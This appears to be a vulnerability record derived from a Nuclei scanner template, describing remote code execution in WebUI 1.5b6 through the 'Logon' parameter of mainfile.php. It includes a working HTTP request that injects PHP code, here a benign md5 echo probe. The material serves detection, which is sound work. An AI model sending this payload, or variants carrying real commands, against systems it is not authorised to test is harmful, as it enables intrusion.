# Vulnerability: WebUI 1.5b6 - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`webui-rce.yaml`)

## Description
WebUI 1.5b6 is vulnerable to remote code execution because the 'mainfile.php' endpoint allows remote attackersto execute arbitrary code via the 'Logon' parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27
```

